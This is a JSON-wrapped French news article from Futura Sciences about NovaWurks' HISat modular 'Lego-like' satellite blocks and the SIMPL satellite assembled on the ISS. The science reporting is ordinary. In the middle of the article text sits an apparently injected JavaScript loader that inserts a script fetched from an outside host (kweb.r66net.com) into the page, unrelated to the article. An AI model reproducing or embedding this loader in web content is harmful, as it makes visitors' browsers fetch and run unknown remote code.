{"title": "HISat, des satellites assemblés en orbite comme des Lego", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "30/10/2017", "content": "Un nouveau type de satellites de petites tailles, de la société américaine NovaWurks, inaugure un principe nouveau : une conception modulaire. Assemblés à la manière de briques Lego, ces modules correspondent chacun à une tâche. Les astronautes de l'ISS ont joué à ce jeu pour réaliser le premier satellite construit en orbite.  Ce qu'il faut retenir Le principe est d'assembler plusieurs modules sans tenir compte de la forme finale du satellite.\r Ce concept peut donner libre cours à l'imagination des scientifiques et ingénieurs qui n'ont plus à se soucier de l'architecture du satellite qui supportera l'instrument et la mission. Il y a quelques jours, à bord de la  Station spatiale internationale , l'équipage a testé une approche radicalement différente de la fabrication des satellites, avec à la clé une petite révolution. L'idée de départ est simple. Au lieu focaliser le travail de conception sur les servitudes du satellite et de concevoir le reste en fonction d'elles, ce sont les servitudes qui vont s'adapter à la mission. En lieu et place du traditionnel bloc monolithique que représente un satellite, dont la forme est définie par le  volume  offert par la coiffe du  lanceur  et la plateforme traditionnellement utilisée pour construire les satellites, la société NovaWurks a inventé un concept astucieux de modules à assembler comme des Lego dans différentes configurations pour répondre aux besoins de n'importe quelle mission. Baptisés  Hyper-Integrated Satlets  (HISat), ces modules sont identiques en taille (20 x 20 x 10 centimètres) et en  masse  (7  kilogrammes ). Ils embarquent tout ce dont a besoin un satellite et remplissent donc différentes fonctions, navigation, communications, traitement des données, propulsion et puissance délivrée. Ils sont aussi capables de communiquer entre eux. Quand ils sont assemblés à l'instrument, le  logiciel  de bord se charge de répartir les différentes tâches et détermine le rôle de chaque HISat. Cette vidéo est certes en anglais mais sa compréhension est facile. Elle montre le principe de fonctionnement de ces blocs HISat qui, une fois assemblés, font office de servitude à tout type d'instruments en orbite. © NovaWurks  Repenser l'ingénierie des satellites Il y a un autre intérêt à construire des satellites à partir d'un assemblage de modules. Aujourd'hui, les satellites sont conçus pour fonctionner sans  maintenance  ni modification pour toute leur  durée  de vie  orbitale . Demain, il sera possible de remplacer des modules défaillants, upgrader le satellite avec des modules plus performants, par exemple sans interruption de service ou de l'acquisition des données.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Aujourd'hui, cette technologie concerne seulement les satellites de très petites tailles, mais dans un futur proche, l'idée est d'être capable de réaliser des satellites de formes plus variées et de tailles plus grandes. Comme le souligne Talbot Jaeger, le fondateur de NovaWurks, si cette innovation aboutit, elle peut  « permettre aux rêveurs de penser différemment la construction des stations spatiales, et les prochaines étapes de l' exploration robotique et humaine  de la  Lune , Mars et l'espace profond » . “ Permettre aux rêveurs de penser différemment la construction de stations spatiales Pour démontrer la faisabilité technique de son concept et tester la facilité avec laquelle chaque bloc peut s'assembler, NovaWurks a prévu trois missions. La première a été réalisée il y a quelques jours à bord de la Station spatiale. Elle a consisté à utiliser six HISats et deux jeux de panneaux solaires pour former un satellite de la Nasa (SIMPL,  Satlet Initial Proofs and Lessons ). Le satellite a été assemblé manuellement par l'équipage du complexe orbital qui l'a ensuite envoyé dans l'espace. La troisième et dernière mission a pour but de tester la technologie HISat à bord d'un satellite envoyé en  orbite géosynchrone , où il sera exposé à des niveaux de rayonnement impossibles à tester en  orbite  basse. CubeSats : des microsatellites à l’assaut de l'espace                       Durant de nombreuses années, les satellites sont restés compliqués à développer et à produire, notamment au niveau de leur électronique interne faite sur mesure. Cependant, depuis quelque temps, on voit émerger des microsatellites tout aussi capables et à la taille bien plus réduite. La chaîne Euronews et l’Agence spatiale européenne (Esa) nous en parlent au cours de ce nouvel épisode de Space.                                       ", "theme": "sciences"}